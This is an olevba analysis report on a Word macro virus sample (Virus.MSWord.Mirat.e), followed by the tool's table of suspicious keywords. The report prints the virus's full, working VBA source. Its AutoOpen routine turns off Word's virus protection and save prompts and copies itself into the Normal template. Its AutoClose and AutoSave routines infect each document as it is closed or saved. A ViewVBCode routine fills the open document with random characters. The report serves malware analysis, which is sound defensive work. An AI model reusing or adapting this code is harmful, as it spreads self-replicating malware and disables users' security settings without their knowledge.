olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacRos.bas 
in file: Virus.MSWord.Mirat.e - OLE stream: 'Macros/VBA/MacRos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 04/18/01 by Stimpy"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
'Viruz: RaYnY_DaY YoHoHo :)
'U are skrewed !
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "RD") <> "GotU" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "RD") = "GotU"
'SecuritY Sucz
With Options
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
        .VirusProtection = False
        .AllowFastSave = True
        .BackgroundSave = True
        .CreateBackup = False
        .SavePropertiesPrompt = False
        .SaveInterval = 10
        .SaveNormalPrompt = False
    End With
     With ActiveDocument
        .ReadOnlyRecommended = False
        .SaveFormsData = False
     End With
Application.DefaultSaveFormat = ""
'So bye bye sec.
'Infection TimE
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
myTemplate.FullName, Name:= _
"MacRos", Object:=wdOrganizerObjectProjectItems
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
Else
StatusBar = "HeHeHe"
End If
End Sub
Sub AutoClose()
'Guess What zis duz ?
On Error Resume Next
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If (num = 0) And (ActiveDocument.Name <> NormalTemplate.Name) Then
ActiveDocument.Variables.Add Name:="Infect"
ActiveDocument.Variables("Infect").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:= _
myTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:="MacRos", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
Sub AutoSave()
'Same ol' stuff
On Error Resume Next
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If (num = 0) And (ActiveDocument.Name <> NormalTemplate.Name) Then
ActiveDocument.Variables.Add Name:="Infect"
ActiveDocument.Variables("Infect").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:= _
myTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:="MacRos", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
Sub ViewVBCode()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "RD") = "GotU" Then
Randomize
n = Int((100000 * Rnd) + 1)
For i = 1 To n
txt = Int((180 * Rnd) + 1)
Selection.TypeText Text:=Chr(txt)
Next i
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

